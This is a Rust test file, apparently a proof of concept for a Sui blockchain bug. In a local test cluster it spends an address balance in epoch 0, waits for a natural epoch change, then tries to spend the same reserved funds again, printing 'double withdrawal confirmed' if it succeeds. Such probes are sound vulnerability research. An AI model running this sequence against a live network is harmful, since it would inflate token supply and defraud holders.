// Copyright (c) Mysten Labs, Inc.
// SPDX-License-Identifier: Apache-2.0

use sui_types::base_types::dbg_addr;
use sui_test_transaction_builder::FundSource;
use test_cluster::addr_balance_test_env::TestEnvBuilder;

#[tokio::test]
async fn poc_double_withdrawal_across_epoch_boundary() {
    let mut test_env = TestEnvBuilder::new().build().await;
    let sender = test_env.get_sender(0);

    test_env.fund_one_address_balance(sender, 1000).await;
    println!("Deposited: 1000 MIST at epoch 0");

    let tx_a = test_env
        .tx_builder(sender)
        .transfer_sui_to_address_balance(
            FundSource::address_fund_with_reservation(1000),
            vec![(1000, dbg_addr(2))],
        )
        .build();
    test_env.exec_tx_directly(tx_a).await.unwrap();
    println!("TX-A (epoch 0): success");

    // Wait for natural epoch change — does NOT force settlement like trigger_reconfiguration()
    test_env.cluster.wait_for_epoch(Some(1)).await;
    println!("Epoch 1 reached via wait_for_epoch (settlement may not have run yet)");

    let tx_b = test_env
        .tx_builder(sender)
        .transfer_sui_to_address_balance(
            FundSource::address_fund_with_reservation(1000),
            vec![(1000, dbg_addr(3))],
        )
        .build();

    match test_env.exec_tx_directly(tx_b).await {
        Ok(_) => {
            println!("=== CRITICAL: TX-B SUCCEEDED = DOUBLE WITHDRAWAL CONFIRMED ===");
            println!("Deposited 1000 MIST, extracted 2000 MIST = SUPPLY INFLATION");
        }
        Err(e) => {
            println!("TX-B failed: {}", e);
        }
    }
}
